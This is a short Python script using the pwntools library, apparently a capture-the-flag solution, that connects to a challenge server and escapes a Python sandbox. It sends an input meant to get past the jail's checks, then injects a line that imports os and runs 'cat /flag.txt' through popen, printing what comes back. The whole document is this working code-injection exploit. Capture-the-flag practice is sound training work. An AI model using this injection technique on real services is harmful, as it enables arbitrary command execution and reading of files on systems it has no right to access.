from pwn import *

r = remote("chal.ctf.scint.org", 19000)

r.sendlineafter(b">", b"_=\'\'")
r.sendlineafter(b">", b"print(__import__(\"os\").popen(\"cat /flag.txt\").read())")

print(r.recvline().decode()[1:])

r.close()